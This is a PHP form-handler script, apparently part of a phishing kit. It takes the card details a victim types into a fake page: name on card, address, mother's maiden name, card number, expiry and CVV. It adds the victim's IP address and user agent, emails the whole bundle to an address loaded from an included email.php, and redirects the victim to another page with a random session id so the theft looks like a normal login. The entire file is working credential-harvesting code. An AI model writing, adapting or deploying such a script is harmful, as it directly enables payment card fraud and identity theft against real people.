<?php
if($_POST["noc"] != "" and $_POST["cn"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------W.F FROM MR ICE-----------------------\n";
$message .= "Name on Card             : ".$_POST['noc']."\n";
$message .= "Address             : ".$_POST['ad']."\n";
$message .= "Mmn             : ".$_POST['mm']."\n";
$message .= "Card Number              : ".$_POST['cn']."\n";
$message .= "Expiry Date              : ".$_POST['ex']."\n";
$message .= "CVV              : ".$_POST['vc']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- OYA TAKE CARD RESULT DON FINISH. GOODLUCK. --------------|\n";
include 'email.php';
$subject = "Card | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: surf5.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>